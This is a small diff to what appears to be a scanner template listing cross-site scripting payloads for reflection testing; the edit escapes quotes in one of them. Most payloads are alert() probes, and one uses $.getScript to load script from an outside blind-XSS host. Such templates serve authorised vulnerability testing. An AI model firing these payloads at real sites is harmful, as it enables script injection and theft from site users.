@@ -17,7 +17,7 @@ http:
     payloads:
       reflection:
         - "'\"><{{first}}"
-        - "<script>$.getScript("//satya.bxss.in")</script>"
+        - "<script>$.getScript(\"//satya.bxss.in\")</script>"
         - "<img src=x onerror=alert({{first}})>"
         - "<script>alert({{first}})</script>"
         - "'><ScRiPt>alert({{first}})</sCrIpT>"
